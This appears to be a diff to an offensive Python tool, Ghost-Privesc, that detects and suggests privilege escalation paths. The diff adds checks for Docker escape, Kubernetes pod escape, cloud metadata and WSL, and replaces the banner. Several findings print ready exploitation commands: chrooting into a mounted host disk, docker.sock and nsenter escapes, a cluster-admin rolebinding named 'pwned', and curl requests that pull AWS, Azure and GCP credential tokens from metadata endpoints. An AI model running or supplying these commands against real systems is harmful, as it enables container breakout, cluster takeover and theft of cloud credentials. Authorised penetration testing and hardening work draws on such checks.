@@ -29,17 +29,56 @@ C = {
     "X": "\033[0m",
 }
 
-BANNER = f"""
-{C['R']}  _____ _               _     ____       _
- / ____| |             | |   |  _ \\     (_)
-| |  __| |__   ___  ___| |_  | |_) |_ __ ___   _____  ___  ___
-| | |_ | '_ \\ / _ \\/ __| __| |  __/| '__| \\ \\ / / _ \\/ __|/ __|
-| |__| | | | | (_) \\__ \\ |_  | |   | |  | |\\ V /  __/ (__\\__ \\
- \\_____|_| |_|\\___/|___/\\__| |_|   |_|  |_| \\_/ \\___|\\___|___/{C['X']}
+def _build_banner():
+    import re as _re
+    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
+    W = "\033[97m"; X = "\033[0m"
+    IW = 68; eq = "\u2550" * IW; sp = " " * IW
+    TL = "\u2554"; TR = "\u2557"; BL = "\u255a"; BR = "\u255d"; VB = "\u2551"
+    hl = "\u2500" * 44; bar = "\u2502"
+    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))
 
-{C['Y']}  Ghost-Privesc v2.0.0  |  Linux & Windows Privilege Escalation Checker{C['X']}
-{C['DIM']}  By Gh0st-Bx1  |  github.com/Ghost-Bx1{C['X']}
-"""
+    def _row(s):
+        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
+        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"
+
+    def _row_l(s):
+        n = vl(s); p = max(0, IW - n - 2)
+        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"
+
+    ga = [
+        (f"{D}         {X}", f"{G}  .-\"\"\"\"\"\"\"\"\"-.  {X}", f"{D}         {X}"),
+        (f"{D}-- -..   {X}", f"{G} /  _       _  \\ {X}", f"{D}   ..- --{X}"),
+        (f"{D}----..   {X}", f"{G}| (:3 )  (:3 )  |{X}", f"{D}   ..----{X}"),
+        (f"{D}----..   {X}", f"{G}|   '--------'  |{X}", f"{D}   ..----{X}"),
+        (f"{D}-...     {X}", f"{G}|    \\ \\U/ /    |{X}", f"{D}     ...-{X}"),
+        (f"{D}         {X}", f"{G}|_______________|{X}", f"{D}         {X}"),
+        (f"{D}         {X}", f"{G} \\/\\/\\ /\\ /\\/\\/ {X}", f"{D}         {X}"),
+    ]
+
+    info = [
+        f"{G}{N}GHOST-PRIVESC{X}",
+        f"{Cy}v2.1.0  {D}Linux & Windows PrivEsc Checker{X}",
+        f"{D}{hl}{X}",
+        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
+        f"{D}{hl}{X}",
+        f"{D}--suid  --sudo  --cron  --caps  --nfs{X}",
+        f"{D}--windows  --docker  --k8s  --imds  --wsl{X}",
+        f"{D}--exploits  --html  --monitor  --completo{X}",
+    ]
+
+    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
+    for left, center, right in ga:
+        combined = left + center + right
+        out.append(_row(combined))
+    out.append(f"{G}{VB}{sp}{VB}{X}")
+    for i in info:
+        out.append(_row_l(i))
+    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
+    return "\n".join(out)
+
+
+BANNER = _build_banner()
 
 _lock = Lock()
 _achados = []
@@ -565,6 +604,181 @@ def verificar_containers():
     if "yes" in kubectl:
         _p("CRITICO", "kubectl com permissao wildcard — cluster admin",
            "kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=default:default")
+
+
+# ─────────────────────────────────────────────────────────────────
+# Docker Escape (deep)
+# ─────────────────────────────────────────────────────────────────
+
+def verificar_docker_escape():
+    _secao("DOCKER ESCAPE (DEEP)")
+
+    cgroup, _ = _run("cat /proc/1/cgroup 2>/dev/null")
+    dockerenv = os.path.exists("/.dockerenv")
+    if not (dockerenv or "docker" in cgroup or "lxc" in cgroup):
+        _p("INFO", "Nao esta dentro de container Docker/LXC")
+        return
+
+    _p("INFO", "Dentro de container detectado")
+
+    # Privilegiado
+    cap, _ = _run("cat /proc/self/status 2>/dev/null | grep CapEff")
+    if "ffffffffffffffff" in cap or "0000003fffffffff" in cap:
+        _p("CRITICO", "Container privilegiado (CapEff full)",
+           "mount /dev/sda1 /mnt && chroot /mnt /bin/bash")
+
+    # cap_sys_admin
+    cap_check, _ = _run("capsh --print 2>/dev/null | grep sys_admin")
+    if "sys_admin" in cap_check:
+        _p("CRITICO", "CAP_SYS_ADMIN disponivel — cgroup release_agent escape",
+           "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && ...\nVer: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation")
+
+    # docker.sock
+    if os.access("/var/run/docker.sock", os.W_OK):
+        _p("CRITICO", "/var/run/docker.sock gravavel — escape via docker run",
+           "docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
+
+    # procfs montado
+    proc_mounts, _ = _run("cat /proc/mounts 2>/dev/null | grep proc")
+    if "proc" in proc_mounts:
+        _p("MEDIO", "procfs montado — possivel leitura de processos do host")
+
+    # nsenter
+    nsenter, _ = _run("which nsenter 2>/dev/null")
+    if nsenter.strip():
+        _p("ALTO", "nsenter disponivel — possivel namespacing para host",
+           "nsenter -t 1 -m -u -i -n /bin/bash")
+
+    # /host ou /mnt com chroot possivel
+    for mnt in ["/host", "/mnt", "/rootfs"]:
+        if os.path.isdir(mnt) and os.path.isfile(os.path.join(mnt, "etc/passwd")):
+            _p("CRITICO", f"Sistema host montado em {mnt}",
+               f"chroot {mnt} /bin/bash")
+
+
+# ─────────────────────────────────────────────────────────────────
+# Kubernetes Pod Escape
+# ─────────────────────────────────────────────────────────────────
+
+def verificar_k8s():
+    _secao("KUBERNETES POD ESCAPE")
+
+    sa_token = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+    sa_cert = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+    sa_ns = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+
+    if not os.path.isfile(sa_token):
+        _p("INFO", "Nao parece ser um pod K8s (sem service account token)")
+        return
+
+    _p("MEDIO", "Pod Kubernetes detectado (service account montado)")
+
+    # Namespace
+    if os.path.isfile(sa_ns):
+        ns, _ = _run(f"cat {sa_ns} 2>/dev/null")
+        _p("INFO", f"Namespace: {ns.strip()}")
+
+    # kubectl in path
+    kubectl_path, _ = _run("which kubectl 2>/dev/null")
+    if kubectl_path.strip():
+        can_do, _ = _run("kubectl auth can-i --list 2>/dev/null | head -5")
+        _p("ALTO", "kubectl disponivel dentro do pod", can_do)
+        all_perms, _ = _run("kubectl auth can-i '*' '*' 2>/dev/null")
+        if "yes" in all_perms:
+            _p("CRITICO", "Permissao wildcard no cluster — cluster-admin possivel",
+               "kubectl create clusterrolebinding pwned --clusterrole=cluster-admin --serviceaccount=$(kubectl config view --raw -o json | jq -r '.contexts[0].context.namespace'):default")
+
+    # hostPID / hostNetwork via /proc
+    host_pid, _ = _run("ls /proc/1/ns/pid 2>/dev/null")
+    own_pid, _ = _run("ls /proc/self/ns/pid 2>/dev/null")
+    if host_pid.strip() and own_pid.strip() and host_pid.strip() == own_pid.strip():
+        _p("CRITICO", "hostPID=true — compartilhando namespace PID com host",
+           "nsenter -t 1 -m -u -i -n -p /bin/bash")
+
+    # Monta sensiveis
+    mounts, _ = _run("cat /proc/self/mountinfo 2>/dev/null | grep -E '(secret|configmap)'")
+    if mounts.strip():
+        _p("MEDIO", "Secrets/ConfigMaps montados no pod", mounts[:200])
+
+
+# ─────────────────────────────────────────────────────────────────
+# Cloud IMDS (AWS / Azure / GCP)
+# ─────────────────────────────────────────────────────────────────
+
+def verificar_imds():
+    _secao("CLOUD IMDS (AWS / AZURE / GCP)")
+
+    import socket as _sock
+    try:
+        _sock.setdefaulttimeout(2)
+        _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM).connect(("169.254.169.254", 80))
+    except Exception:
+        _p("INFO", "IMDS endpoint 169.254.169.254 nao acessivel")
+        return
+
+    _p("INFO", "IMDS endpoint 169.254.169.254 acessivel — testando provedores")
+
+    # AWS
+    aws_token, _ = _run("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null")
+    if aws_token.strip():
+        role, _ = _run("curl -s -m 2 -H 'X-aws-ec2-metadata-token: " + aws_token.strip() + "' http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
+        if role.strip():
+            _p("CRITICO", f"AWS IMDS acessivel — IAM role: {role.strip()}",
+               f"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role.strip()}")
+        else:
+            _p("ALTO", "AWS IMDS acessivel (sem IAM role exposta diretamente)")
+
+    # Azure
+    az, _ = _run("curl -s -m 2 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null")
+    if "subscriptionId" in az or "resourceGroupName" in az:
+        _p("CRITICO", "Azure IMDS acessivel — metadata obtido",
+           "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
+
+    # GCP
+    gcp, _ = _run("curl -s -m 2 -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/ 2>/dev/null")
+    if gcp.strip() and "404" not in gcp:
+        _p("CRITICO", "GCP Metadata acessivel",
+           "curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+
+
+# ─────────────────────────────────────────────────────────────────
+# WSL Escape
+# ─────────────────────────────────────────────────────────────────
+
+def verificar_wsl():
+    _secao("WSL ESCAPE")
+
+    proc_ver, _ = _run("cat /proc/version 2>/dev/null")
+    if "microsoft" not in proc_ver.lower() and "wsl" not in proc_ver.lower():
+        _p("INFO", "Nao parece ser ambiente WSL")
+        return
+
+    _p("MEDIO", "Ambiente WSL detectado")
+
+    # Acesso ao Windows filesystem
+    for path in ["/mnt/c/Windows/System32", "/mnt/c/Users"]:
+        if os.path.isdir(path):
+            _p("ALTO", f"Sistema de arquivos Windows acessivel: {path}",
+               f"ls {path}")
+
+    # Executaveis .exe acessiveis
+    exe, _ = _run("which cmd.exe 2>/dev/null || which powershell.exe 2>/dev/null")
+    if exe.strip():
+        _p("ALTO", f"Executaveis Windows acessiveis: {exe.strip()}",
+           "cmd.exe /c whoami\npowershell.exe -c 'Get-LocalUser'")
+
+    # WSL interop habilitado
+    interop, _ = _run("cat /proc/sys/fs/binfmt_misc/WSLInterop 2>/dev/null")
+    if "enabled" in interop:
+        _p("MEDIO", "WSL Interop habilitado — pode executar .exe do Windows diretamente")
+
+    # Credenciais Windows via DPAPI
+    dpapi_paths = [
+        "/mnt/c/Users",
+    ]
+    for p in dpapi_paths:
+        if os.path.isdir(p):
+            _p("INFO", f"Possivel acesso a perfis Windows em {p} (DPAPI/credenciais)")
 
 
 # ─────────────────────────────────────────────────────────────────
@@ -1128,12 +1342,21 @@ def main():
                    help="Enumerar servicos D-Bus perigosos")
     p.add_argument("--exploits", action="store_true",
                    help="Sugerir exploits publicos baseado no kernel")
+    p.add_argument("--docker", action="store_true",
+                   help="Docker escape (deep) — socket, privilegiado, cap_sys_admin, nsenter")
+    p.add_argument("--k8s", action="store_true",
+                   help="Kubernetes pod escape — hostPID, SA token, kubectl, mounts")
+    p.add_argument("--imds", action="store_true",
+                   help="Cloud IMDS — AWS 169.254.169.254, Azure, GCP metadata")
+    p.add_argument("--wsl", action="store_true",
+                   help="WSL escape — /proc/version, /mnt/c, interop, exe Windows")
     p.add_argument("--output", metavar="FILE", help="Salvar relatorio em JSON")
     p.add_argument("--html", metavar="FILE", help="Salvar relatorio em HTML (dark theme)")
     args = p.parse_args()
 
     novos_flags = [args.windows, args.pkexec, args.lib_hijack, args.sudo_token,
-                   args.monitor, args.dbus, args.exploits]
+                   args.monitor, args.dbus, args.exploits,
+                   args.docker, args.k8s, args.imds, args.wsl]
     linux_flags = [args.sistema, args.kernel, args.sudo, args.suid, args.caps,
                    args.cron, args.servicos, args.path, args.nfs, args.senhas,
                    args.containers, args.graveis, args.env, args.processos,
@@ -1187,6 +1410,14 @@ def main():
             verificar_dbus()
         if executar_tudo or args.exploits:
             sugerir_exploits()
+        if executar_tudo or args.docker:
+            verificar_docker_escape()
+        if executar_tudo or args.k8s:
+            verificar_k8s()
+        if executar_tudo or args.imds:
+            verificar_imds()
+        if executar_tudo or args.wsl:
+            verificar_wsl()
         if args.monitor:
             monitorar_processos()
         if args.windows:
